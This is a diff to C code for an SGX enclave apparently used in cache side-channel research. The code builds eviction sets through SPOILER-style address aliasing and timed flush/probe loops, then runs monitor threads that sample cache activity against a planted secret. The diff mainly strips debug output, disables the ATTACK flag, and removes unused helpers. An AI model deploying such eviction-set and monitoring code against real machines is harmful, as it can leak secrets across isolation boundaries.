@@ -43,12 +43,12 @@
 #define DEBUG_CACHE 0
 #define REPS 30
 #define OFFSET 27
-#define TIME_FLUSH 270
+#define TIME_FLUSH 300
 #define MARGIN 180
 #define INTERLEAVED 1
 #define FULL_SET 0
 #define LINE_OFF 8
-#define ATTACK 1
+#define ATTACK 0
 #define CONTINUOS 0
 
 typedef uint64_t sys_word_t;
@@ -95,7 +95,6 @@ extern "C"
 pthread_t counter_task;
 pthread_t monitor_task;
 uint32_t data_size;
-uint8_t sealed_data;
 long int timeini;
 
 thread_data_t *thread_data;
@@ -157,32 +156,6 @@ int printFile(const char *fmt, ...)
     va_end(ap);
     ocall_write_plain_string(buf);
     return (int)strnlen(buf, BUFSIZ - 1) + 1;
-}
-
-/*
-    ECALL function to parse input
-*/
-sgx_status_t get_data_ready(const uint8_t *sealed_in, size_t data_size_in)
-{
-    if (sealed_in == NULL)
-    {
-        return SGX_ERROR_INVALID_PARAMETER;
-    }
-    if (data_size_in == 0)
-    {
-        if (assign_secret(&sealed_data, &data_size) == 0)
-        {
-            printf("Data size %u \n", data_size);
-            ocall_save_sealed_data(&sealed_data, data_size);
-        }
-        printf("Hello World ready %i \n", (int8_t)secret_data[0]);
-        printf("Counter %li \n", global_counter);
-        return SGX_SUCCESS;
-    }
-    //Retrieve the sealeed data
-    sgx_status_t ret = unseal_data(sealed_in, data_size_in);
-    printf("Hello World retrieved %i %i %i\n", (uint32_t)secret_data[0], (int8_t)secret_data[0], ret);
-    return ret;
 }
 
 int get_eax(void)
@@ -411,113 +384,13 @@ void build_ev_set(int offset, long int ev_set[MONITORED_SETS * CACHE_SET_SIZE * 
     }
 }
 
-/*
- * TLB function
- */
-
-void gen_tlb(void)
-{
-    printf("val %lx \n", eviction_set_tlb[0]);
-    build_tlb_eviction(EV_SET_SIZE, eviction_set_tlb);
-    int i;
-    for (i = 0; i < EV_SET_SIZE; i++)
-    {
-        printf("%lx %i %li \n", eviction_set_tlb[i], addr2slice_linear((unsigned long)eviction_set_tlb[i], 128), ((eviction_set_tlb[i]) >> PAGE_BITS) & 0x0000000F);
-    }
-    printf("%lx \n", (long unsigned int)&memory_map_tlb[RESERVED_MEMORY_TLB - 1]);
-    //Write the linked list
-
-    for (i = 0; i < EV_SET_SIZE; ++i)
-    {
-        long int *dir_mem = (long int *)eviction_set_tlb[i];
-        long int dir_sig = eviction_set_tlb[(i + 1) % (EV_SET_SIZE)];
-        *(dir_mem) = dir_sig;
-    }
-}
-
-/*int build_array(int border, int init, int off, int spoiler_trials)
-{
-    int res = 1;
-    int ensure256[2 * SPOILER_SETS];
-    int i, ind = 0, j, k, samps, cont = 0, c, l = 0;
-    for (j = 0; j < 2 * SPOILER_SETS; j++)
-    {
-        ensure256[j] = border + j;
-    }
-    //while (cont < SPOILER_SETS)
-    //{
-    for (j = border; j < (border + SPOILER_SETS); j++)
-    {
-        while ((ensure256[ind]) == (-1))
-        {
-            printf("Err %i %i %i\n", j,j-border, ind);
-            ind++;
-            if (ind > 2 * SPOILER_SETS)
-            {
-                return -1;
-            }
-        }
-        //j = ensure256[ind];
-        long int s_set[PAGE_COUNT] = {0};
-        for (k = 1; k <= spoiler_trials; k++)
-        {
-            address_aliasing(WINDOW_SIZE, j, init + off, measurements);
-            samps = peak_search(s_set, measurements);
-            //printf("Samps %i \n",samps);
-        }
-        c = 0;
-        for (i = 0; i < PAGE_COUNT; i++)
-        {
-            if (s_set[i] > 0.3 * spoiler_trials)
-            {
-                array_addresses[l][c] = (long int)(&memory_map[i * PAGE_SIZE + init + off]);
-                if (((i - border) >= 0) && ((i - border) < 2 * SPOILER_SETS))
-                {
-                    printf("Bord %i %li %i \n", i, s_set[i], j - border);
-                    ensure256[(i - border)] = -1;
-                }
-                if (1)
-                //if ((j == border) || (j == (border + 1)))
-                {
-                    printf("Peak %i %li %i %li\n", i, s_set[i], j - border, measurements[i]);
-                }
-                c++;
-                if (c >= SPOILER_PEAKS)
-                {
-                    break;
-                }
-            }
-        }
-        if (c < (10))
-        {
-            j--;
-            l--;
-            spoiler_trials += 50;
-            res++;
-            if (res > 20)
-            {
-                return 0;
-            }
-        }
-        else
-        {
-            spoiler_trials = 100;
-        }
-        l++;
-        //printf("Peak %i %i\n", j - border, c);
-        printf("Peak %i %i %i\n", cont, ind, c);
-        cont++;
-        ind++;
-    }
-    return res;
-}*/
 
 int build_array(int border, int init, int off, int spoiler_trials)
 {
     int res = 1;
     int trials = spoiler_trials;
     int i, j, k, samps, c, l = 0;
-    int expected_size = 28;
+    int expected_size = CACHE_SLICES+CACHE_SLICES/2;
     for (j = border; j < (border + SPOILER_SETS); j++)
     {
         trials = spoiler_trials;
@@ -526,7 +399,6 @@ int build_array(int border, int init, int off, int spoiler_trials)
         {
             address_aliasing(WINDOW_SIZE, j, init + off, measurements);
             samps = peak_search(s_set, measurements);
-            //printf("Samps %i \n",samps);
         }
         c = 0;
         for (i = 0; i < PAGE_COUNT; i++)
@@ -535,7 +407,7 @@ int build_array(int border, int init, int off, int spoiler_trials)
             {
                 array_addresses[l][c] = (long int)(&memory_map[i * PAGE_SIZE + init + off]);
                 //if (j == border)
-                if (1)
+                if (DEBUG)
                 {
                     printf("Peak %i %li %i %li\n", i, s_set[i], j - border, measurements[i]);
                 }
@@ -569,7 +441,7 @@ int build_array(int border, int init, int off, int spoiler_trials)
             trials = spoiler_trials;
         }
         l++;
-        printf("Peak %i %i %i\n", j - border, c, samps);
+        printf("Peak %i %i with %i samples\n", j - border, c, samps);
     }
     return res;
 }
@@ -703,8 +575,8 @@ void spoiler_cache(int reduced_set[SPOILER_SETS], int pre_set[SPOILER_SETS], lon
                 }
             }
             double ratio = (100.0 * cont2) / (double)cont1;
-            printf("Ratio %f\n", ratio);
-            if (ratio > 40)
+            //printf("Ratio %f\n", ratio);
+            if (ratio > 30)
             {
                 reduced_set[l] = l;
                 printf("Included %d %f\n", l, ratio);
@@ -861,19 +733,17 @@ void get_reduced_set(int reduced_set[SPOILER_SETS], int pre_set[SPOILER_SETS], l
             }
             if (cont1 <= CACHE_SET_SIZE * CACHE_SLICES + range1)
             {
-                printf("Values count %i %i %i %i\n", avail, last_avail, cont1,stuck);
+                //printf("Values count %i %i %i %i\n", avail, last_avail, cont1,stuck);
                 if (last_avail >= CACHE_SET_SIZE * CACHE_SLICES)
                 {
                     range = last_avail - CACHE_SET_SIZE * CACHE_SLICES + 1;
                 }
-                if (stuck>10)
+                if (stuck>6)
                 {
                     range = last_avail - CACHE_SET_SIZE * CACHE_SLICES - 2;
-                    //range1 = range;
                 }
             }
             avail = last_avail;
-            //last_red = num_sets;
         }
         else
         {
@@ -952,7 +822,7 @@ int test_selection(int reps, int reduced_set[SPOILER_SETS], int *lim, long int t
             v++;
         }
     }
-    printf("The filtered set goes to %i \n", v);
+    //printf("The filtered set goes to %i \n", v);
     return v;
 }
 
@@ -1015,7 +885,7 @@ LAB:
         cont1++;
         if (cont1 > cont)
         {
-            printf("Evicted %i\n", v);
+            printf("Noisy %i\n", v);
             reps++;
             if (reps > 20)
             {
@@ -1025,7 +895,7 @@ LAB:
         }
     }
 
-    printf("First pass %i %i\n", cont1, cont);
+    //printf("First pass %i %i\n", cont1, cont);
     ///Now reduce the set
 
     //randomize_set(filtered_set, cont1);
@@ -1129,9 +999,11 @@ LAB:
         }
         else
         {
-            if (cont2 == CACHE_SET_SIZE)
-            {
-                printf("Ops!! \n");
+            if (DEBUG){
+                if (cont2 == CACHE_SET_SIZE)
+                {
+                    printf("Ops!! \n");
+                }
             }
         }
     }
@@ -1145,7 +1017,10 @@ LAB:
         }
         //printf("%i ", tmes);
     }
-    printf("\n %i \n", v);
+    if (DEBUG)
+    {
+        printf("\n %i \n", v);
+    }
     for (l = 0; l < CACHE_SET_SIZE; l++)
     {
         ev_set[index * CACHE_SET_SIZE + l] = filtered_set1[l];
@@ -1170,7 +1045,7 @@ void complete_eviction_set(int orig_cont, long int t_address, int red_set[SPOILE
     long int old_address = t_address;
     long int test_address1;
     int st = 0;
-    printf("Test complete address %lx \n", test_address);
+    //printf("Test complete address %lx \n", test_address);
     int valid = 1;
     int ind = index;
     while (i < CACHE_SLICES)
@@ -1316,10 +1191,10 @@ void complete_eviction_set(int orig_cont, long int t_address, int red_set[SPOILE
         }
         if (v > 200)
         {
-            printf("Goto new %i\n", v);
+            printf("Candidate invalid, evicted %i out of 2000 \n", v);
             goto NEW_ADD;
         }
-        printf("Valid %i\n", v);
+        //printf("Valid %i\n", v);
         v = 0;
         k = 0;
         while (v < 1500)
@@ -1340,7 +1215,7 @@ void complete_eviction_set(int orig_cont, long int t_address, int red_set[SPOILE
                 }
                 //printf("%i ", tmes);
             }
-            printf("The simp go to %i %i %i\n", v, i, k);
+            //printf("The simp go to %i %i %i\n", v, i, k);
             k++;
             if (k > 20)
             {
@@ -1354,215 +1229,14 @@ void complete_eviction_set(int orig_cont, long int t_address, int red_set[SPOILE
 
 void gen_plot(int rounds)
 {
-    int i, j, k, c, c1, p;
-    int stuck = 0;
-    int num_peaks = 0;
-    int peak_count = 0;
-    int chunk = 13;
-    int repetitions = 1000;
-    //int candidates[rounds] = {0};
-    long int peaks[1024] = {0};
-    int exits[1024] = {0};
-    long int candidates[1024] = {0};
-    //int candidates_count[lim] = {0};
-    long int t;
-    int ini_border = 0;
+
     int ini = 0 * RESERVED_RAM;
-    int lim = 1 * RESERVED_RAM;
-    long int max = 0;
-    double mean = 0.0;
-    double prev_mean = 475.5;
-    double mar = MARGIN;
-    double d;
-    //int border_ant = 0;
-    ////int border_conf = 0;
-
-    //ini = 0x1000;
-
-    for (k = 1; k <= 1; k++)
-    {
-        /*Important! start in a physical address ending in 0xFC0*/
-        //lim = 2 * 4*1024*1024;
-        //ini = 1 * 4*1024*1024;
-    STT:
-        num_peaks = 0;
-        //ini = 0x1000;
-        for (i = ini; i < ini + 0xFFF; i++)
-        {
-            if ((((long int)(&memory_map[i])) & 0xFFF) == 0xFC0)
-            {
-                ini = i;
-                break;
-            }
-        }
-        //ini = RESERVED_RAM + 0xFC0;
-
-        for (j = 0; j < 1000; j++)
-        {
-            candidates[j] = 0;
-        }
-        printf("Starting at: %i %lx %lx\n", i, (&memory_map[ini]), (&memory_map[ini + 64]));
-        j = 0;
-        while (j < rounds)
-        //for (j = 0; j < rounds; j++)
-        {
-            max = 0;
-            c = 0;
-            for (i = ini; i < lim; i += 4096)
-            {
-                //candidates_count[i]=0;
-                get_eax();
-                t = hammer((long int *)&memory_map[i], (long int *)&memory_map[i + 64], repetitions);
-                lfence();
-                mfence();
-                exits[c] = get_eax();
-                d = (t / repetitions);
-                if ((t > max) && (d < 2000))
-                {
-                    max = t;
-                    ram_border = i + 64;
-                    ///border_conf = i;
-                }
-                //printf("%i %i \n",c,(i + 64) >> 12);
-                if (d > (prev_mean + mar))
-                {
-                    candidates[c]++;
-                }
-                mean += d;
-                peaks[c] = (long int)d;
-                c++;
-                //t=access_timed((long int*) &memory_map[i]);
-                //printf("Map %i %li %lx %lx %i %li\n", (i >> 12), t / 100, &memory_map[i], &memory_map[i + 128], ram_border, global_counter);
-                //printf("Map %i %li %li\n", (i >> 12), t / repetitions, t);
-            }
-            c1 = 0;
-            mean = mean / c;
-            mar = (max / repetitions) - mean - 30.0;
-            //mar = 50.0;
-            //printf("%f \n",mar);
-            prev_mean = mean;
-            if (mean < 260)
-            {
-                //ini = 0x1000;
-                //ini_border += 0x1000;
-                //if (ini_border > (RESERVED_MEMORY-RESERVED_RAM))
-                //{
-                //    ini_border=0;
-                //}
-                prev_mean = 270;
-                //ini = ini_border;
-                //lim = ini + RESERVED_RAM;
-                //goto STT;
-            }
-            //prev_mean = mean;
-            int cext = 0;
-            for (i = 0; i < 1024; i++)
-            {
-                //printf("%i ",exits[i]);
-                cext += exits[i];
-                if (peaks[i] > (prev_mean + mar))
-                {
-                    c1++;
-                    //printf("%i ", i);
-                    printf("%i %f %f\n", i, peaks[i] - mean, prev_mean);
-                }
-            }
-            printf("cext %i\n", cext);
-            if ((c1 < 6) && (c > 0))
-            {
-                p = ((ram_border) >> 12) % 1024;
-                printf("maxMean %f %i %i %f %i\n", (max / repetitions) - mean, (ram_border) >> 12, candidates[p], mean, num_peaks);
-                candidates[p]++;
-                j = candidates[p];
-                stuck = 0;
-                if (c1 == 1)
-                {
-                    num_peaks--;
-                    if (num_peaks < 0)
-                        num_peaks = 0;
-                }
-                else
-                {
-                    num_peaks++;
-                    if (num_peaks >= 100)
-                    {
-                        peak_count++;
-                        ini = peak_count * 1024 * 1024;
-                        //ini = peak_count * RESERVED_RAM;
-                        ini += ini_border;
-                        lim = ini + RESERVED_RAM;
-                        if (lim > RESERVED_MEMORY)
-                        {
-                            ini = ini_border;
-                            //ini = 0x1000;
-                            lim = ini + RESERVED_RAM;
-                            peak_count = -1;
-                        }
-                        goto STT;
-                    }
-                }
-            }
-            else
-            {
-                stuck++;
-                num_peaks++;
-                if ((stuck > 300) || (num_peaks >= 100))
-                {
-                    printf("Stuck \n");
-                    if (prev_mean == 270)
-                    {
-                        ini_border ^= 0x1000;
-                        if (ini_border > (RESERVED_MEMORY - RESERVED_RAM))
-                        {
-                            ini_border = 0;
-                        }
-                        //prev_mean = 400;
-                        ini = ini_border;
-                        lim = ini + RESERVED_RAM;
-                        goto STT;
-                    }
-                    //printf("Stuck \n");
-                    peak_count++;
-                    //ini = peak_count * RESERVED_RAM;
-                    ini = peak_count * 1024 * 1024;
-                    ini += ini_border;
-                    lim = ini + RESERVED_RAM;
-                    if (ini > RESERVED_MEMORY)
-                    {
-                        ini = 0;
-                        lim = ini + RESERVED_RAM;
-                        peak_count = -1;
-                    }
-                    stuck = 0;
-                    goto STT;
-                }
-            }
-            //printf("Candidate %i %i \n", memory_map[ram_border], (ram_border) >> 12);
-            //candidates_count[ram_border]=1;
-        }
-        printf("Final candidates\n");
-
-        for (j = 0; j < 1024; j++)
-        {
-            if (candidates[j] > rounds / 2)
-            {
-                printf("%i ", j);
-            }
-        }
-        printf("\n");
-        //border_ant = ram_border;
-        printf("Ram border %i %i %i %i\n", (ram_border) >> 12, ram_border, (ini >> 12), (lim >> 12));
-    }
-
-    //build_ev_set(TEST_SET);
-
-    // For testing the value of the previous one
+    ram_border = ini + 64;
     ini = (ram_border)&0x00000FFF;
-    //ram_border = ram_border - 64;
     int val = (ram_border - ini) >> 12;
-    val--;
+    int i, j, k;
 
-    printf("Origintal value %i %i %lx\n", val, ini, &memory_map[ram_border]);
+    printf("Initial values for the spoiler array %i %i %lx\n", val, ini, &memory_map[ram_border]);
     uint32_t rd;
     sgx_read_rand((unsigned char *)&rd, 4);
     int offset = OFFSET;
@@ -1589,7 +1263,7 @@ void gen_plot(int rounds)
     {
         pre_reduced_set[l] = l;
     }
-    printf("DATA %i %i %i\n", val, ini, offset);
+    //printf("DATA %i %i %i\n", val, ini, offset);
 
     //Build the evictions sets,
 
@@ -1607,8 +1281,8 @@ void gen_plot(int rounds)
             //FOR THE SECOND ADDRESS
             printf("Build eviction set %i %i\n", ind, crep);
             long int test_address = (long int)(&memory_map[set_num * PAGE_SIZE + ini + offset]);
-            printf("Addresses %lx %lx %i %i\n", test_address, (long int)(&memory_map[set_num * PAGE_SIZE + ini]), offset, val);
-            printf("Origintal value %i %i %lx\n", val, ini, &memory_map[ram_border]);
+            printf("Addresses %lx %lx %i %i\n\n", test_address, (long int)(&memory_map[set_num * PAGE_SIZE + ini]), offset, val);
+            //printf("Origintal value %i %i %lx\n", val, ini, &memory_map[ram_border]);
 
             for (k = 0; k < CACHE_SLICES * CACHE_SET_SIZE; k++)
             {
@@ -1646,9 +1320,9 @@ void gen_plot(int rounds)
                     }
                     //printf("%i ", tmes);
                 }
-                printf("The final test goes to %i \n", v);
+                //printf("The final test goes to %i \n", v);
             }
-            printf("The final test goes to %i \n", v);
+            //printf("The final test goes to %i \n", v);
             add_lim[0] = test_address;
             //Repeat for each of the ways
             complete_eviction_set(cont, test_address, reduced_set, pre_reduced_set, add_lim, ev_set_test, ind, eviction_set, crep);
@@ -1673,56 +1347,7 @@ void gen_plot(int rounds)
         printf("\n");
     }
 
-    /* 
-    //FOR THE SECOND ADDRESS
-    printf("Build second eviction set \n");
-    //ram_border = ram_border + 64;
-    val = val + 1;
-    //ini = (ram_border)&0x00000FFF;
-    test_address = (long int)(&memory_map[val * PAGE_SIZE + ini + offset]);
-    printf("Addresses %lx %lx %i\n", test_address, (long int)(&memory_map[val * PAGE_SIZE + ini]), offset);
-    printf("Origintal value %i %i %lx\n", val, ini, &memory_map[ram_border]);
-    start_set = 20;
-BAD_SPOT1:
-    v = 0;
-    get_reduced_set(reduced_set, test_address, 6, 1, start_set);
-    v = test_selection(1000, reduced_set, &cont, test_address);
-
-    while (v < 900)
-    {
-        get_reduced_set(reduced_set, test_address, 6, 1, start_set);
-        v = test_selection(1000, reduced_set, &cont, test_address);
-        start_set++;
-        start_set = start_set % SPOILER_SETS;
-    }
-
-    while (v < 1500)
-    {
-        res = get_min_set(test_address, cont, eviction_set_1, 0);
-        if (res != 0)
-        {
-            goto BAD_SPOT1;
-        }
-        v = 0;
-        for (l = 0; l < 2000; l++)
-        {
-            tmes = probe_candidate_flush(CACHE_SET_SIZE, eviction_set_1, (long int *)test_address);
-            if (tmes > TIME_FLUSH)
-            {
-                v++;
-            }
-            //printf("%i ", tmes);
-        }
-        printf("The final test goes to %i \n", v);
-    }
-    printf("The final test goes to %i \n", v);
-    eviction_add_1[0] = test_address;
-
-    //Repeat for each of the ways
-    complete_eviction_set(cont, test_address, reduced_set, eviction_add_1, eviction_set_1, 1); */
-
     build_ev_set(OFFSET, eviction_set, eviction_set_1, final_eviction_set, mon_ways);
-    //gen_tlb();
     pthread_mutex_lock(&mutex_start);
     monitor_ready = 1;
     pthread_mutex_unlock(&mutex_start);
@@ -1730,55 +1355,7 @@ BAD_SPOT1:
     printf("Done\n");
 }
 
-/*
- * Monitor aux function
- *
- */
 
-/* void collect_samples_cache(long int address, long int samples[SAMPLES_SIZE * MONITORED_SETS * WAYS_FILLED * CACHE_SLICES],
-                           size_t s_rip[SAMPLES_SIZE * MONITORED_SETS * WAYS_FILLED * CACHE_SLICES], int s_exit[SAMPLES_SIZE * MONITORED_SETS * WAYS_FILLED * CACHE_SLICES],
-                           long int s_time[SAMPLES_SIZE * MONITORED_SETS * WAYS_FILLED * CACHE_SLICES])
-{
-    int i;
-    if (FULL_SET)
-    {
-        int j = 0;
-        for (i = 0; i < 2 * SAMPLES_SIZE * WAYS_FILLED * CACHE_SLICES; i++)
-        {
-            long int begin = final_eviction_set[(j % (2 * CACHE_SLICES)) * CACHE_SET_SIZE];
-            s_time[i] = global_counter - timeini;
-            timeini = global_counter;
-            samples[i] = prime_ev_set(begin);
-            //access_timed(begin, &samples[i]);
-            //begin = (long int *)(*begin);
-            s_rip[i] = get_rip();
-            lfence();
-            s_exit[i] = get_eax();
-            j++;
-            //mem_access((long int *)eviction_add[i % CACHE_SLICES]);
-        }
-    }
-    else
-    {
-        long int *begin = (long int *)address;
-        prime_ev_set(address);
-        prime_ev_set(address);
-        mfence();
-        for (i = 0; i < 2 * SAMPLES_SIZE * WAYS_FILLED * CACHE_SLICES; i++)
-        {
-            s_time[i] = global_counter - timeini;
-            timeini = global_counter;
-            access_timed(begin, &samples[i]);
-            begin = (long int *)(*begin);
-            s_rip[i] = get_rip();
-            lfence();
-            s_exit[i] = get_eax();
-            //mem_access((long int *)eviction_add[i % CACHE_SLICES]);
-        }
-    }
-} */
-
-//int s_exit[SAMPLES_SIZE * MONITORED_SETS * WAYS_FILLED * CACHE_SLICES]
 void collect_samples_cache(long int address, long int samples[SAMPLES_SIZE * MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES],
                            size_t s_rip[SAMPLES_SIZE * MONITORED_SETS * CACHE_SET_SIZE * CACHE_SLICES])
 {
@@ -1900,42 +1477,6 @@ void collect_samples_attack(long int address)
     }
 }
 
-void collect_samples_tlb(long int pos_data, long int s_tlb[SAMPLES_SIZE * EV_SET_SIZE], size_t s_rip[SAMPLES_SIZE * EV_SET_SIZE], int s_exit[SAMPLES_SIZE * EV_SET_SIZE], long int s_time[SAMPLES_SIZE * EV_SET_SIZE])
-//, long int samples_tlb[SAMPLES_SIZE * EV_SET_SIZE])
-{
-    int i;
-    long int *begin = (long int *)pos_data;
-    //long int t1;
-    for (i = 0; i < SAMPLES_SIZE * EV_SET_SIZE; i++)
-    {
-        s_time[i] = global_counter - timeini;
-        timeini = global_counter;
-        access_timed(begin, &s_tlb[i]);
-        begin = (long int *)(*begin);
-        s_rip[i] = get_rip();
-        lfence();
-        s_exit[i] = get_eax();
-        //address = (long int *)access_timed(address, &t1);
-        //printf("Tim %li %lx\n", t1, address);
-        //samples_tlb[i]=(long int)address;
-    }
-}
-
-void collect_samples_set(long int address, long int s_tlb[SAMPLES_SIZE * EV_SET_SIZE], size_t s_rip[SAMPLES_SIZE * EV_SET_SIZE], int s_exit[SAMPLES_SIZE * EV_SET_SIZE], long int s_time[SAMPLES_SIZE * EV_SET_SIZE])
-{
-    int i;
-    //long int t1;
-    for (i = 0; i < SAMPLES_SIZE * EV_SET_SIZE; i++)
-    {
-        s_time[i] = global_counter - timeini;
-        timeini = global_counter;
-        s_tlb[i] = prime_ev_set(address);
-        s_rip[i] = get_rip();
-        lfence();
-        s_exit[i] = get_eax();
-        //samples_time[i] = timeini;
-    }
-}
 
 /*
  * Monitor function
@@ -2071,36 +1612,6 @@ void *monitor_sets_file(void *)
     pthread_mutex_unlock(&global_mutex); */
 }
 
-/*
- * Monitor function
- */
-
-void *monitor_sets(void *)
-{
-    int i, j;
-    //long int *address = (long int *)eviction_set_tlb[0];
-    long int address = eviction_set_tlb[0];
-    //int cont;
-    j = REPS + 10;
-    while (j < REPS)
-    {
-        //collect_samples_set(address, samples_tlb, samples_rip, samples_exit, samples_time);
-        //collect_samples_tlb(address, samples_tlb, samples_rip, samples_exit, samples_time);
-        if (DEBUG)
-        {
-            for (i = 0; i < SAMPLES_SIZE * EV_SET_SIZE; i++)
-            {
-                //cont = i % (EV_SET_SIZE);
-                //if (cont == 0)
-                //{
-                //    printf("\n Tim ");
-                //}
-                printf("Tim %li %zx \n", samples_tlb[i], samples_rip[i]);
-            }
-        }
-        j++;
-    }
-}
 
 void printf_helloworld()
 {
@@ -2111,52 +1622,28 @@ void printf_helloworld()
     stack = (char *)(thread_data->first_ssa_gpr);
     regs[20] = 0;
     timeini = 0;
-    //stack[160]=0;
-    /*     for(i=0;i<23;i++)
-    {
-        printf("Saved gpr: %i %zx \n",i,regs[i]);
-        printf("Char gpr: %i %x \n",i,stack[160+i]);
-        stack[160]=0;
-        stack[161]=0;
-        regs[20]=0;
-        //regs[i]=0;
-    }
-    //regs[18]=0;
-    //(*stack)=0;
-    printf("Saved gpr: %zx \n", regs[18]);
-    thread_data = get_thread_data();
-    regs = (size_t*)(thread_data->first_ssa_gpr); */
 
     // Ensure the counter is running
     if (!(check_running()))
         pthread_create(&counter_task, NULL, fast_counter, NULL);
     //Assign the secret
-    if (assign_secret(&sealed_data, &data_size) == 0)
-    {
-        printf("Data size %u \n", data_size);
-        ocall_save_sealed_data(&sealed_data, data_size);
-    }
     if (!(check_ready()))
     {
         gen_plot(30);
-        //gen_tlb();
         pthread_mutex_lock(&mutex_start);
         while (!(check_ready()))
         {
             pthread_cond_wait(&condp, &mutex_start);
         }
         pthread_mutex_unlock(&mutex_start);
-        //pthread_create(&monitor_task, NULL, monitor_sets, NULL);
         pthread_create(&monitor_task, NULL, monitor_sets_old, NULL);
     }
     increase_counter();
     long int examp = global_counter;
-    printf("Hello World %i \n", (int8_t)secret_data[0]);
-    printf("Counter %li %li\n", global_counter, examp);
-    /*     pthread_cancel(counter_task);
-    pthread_mutex_lock(&global_mutex);
-    monitor_running = 0;
-    pthread_mutex_unlock(&global_mutex); */
+    if (DEBUG){
+        printf("Hello World %i \n", (int8_t)secret_data[0]);
+        printf("Counter %li %li\n", global_counter, examp);
+    }
 }
 
 void printfile_measurements(int *ways)
